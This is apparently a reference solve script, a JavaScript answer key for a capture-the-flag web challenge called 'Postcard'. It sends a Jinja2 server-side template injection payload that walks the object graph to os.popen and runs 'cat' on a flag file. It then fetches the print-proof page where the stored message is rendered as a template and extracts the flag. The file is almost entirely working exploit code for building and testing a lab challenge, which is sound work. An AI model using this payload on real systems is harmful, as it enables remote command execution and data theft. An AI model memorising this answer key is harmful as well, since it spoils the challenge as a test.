// Reference solve — Postcard, Inquisitor. /preview no longer renders the saved message: it returns a draft id in
// data-draft and a link to the print stage. The print proof renders that saved message as a Jinja2 template (the
// second-order sink), so the same object-graph file read as Acolyte works there. Implementer-supplied.
const base = process.argv[2];
// Walk config -> Config -> __init__ -> __globals__ -> os, then run `cat` on the planted flag file from the print proof.
const PAYLOAD = "{{ config.__class__.__init__.__globals__.os.popen('cat /tmp/postcard/flag.txt').read() }}";
const res = await fetch(`${base}/preview`, {
  method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({ style: 'Birthday', message: PAYLOAD }),
});
const page = await res.text();
const draft = page.match(/data-draft="([A-Za-z0-9_-]+)"/);
if (!draft) process.exit(0);
const proof = await fetch(`${base}/orders/${draft[1]}/print`);
const m = (await proof.text()).match(/HVWA\{[a-z2-7]{26}\}/);
if (m) console.log(m[0]);
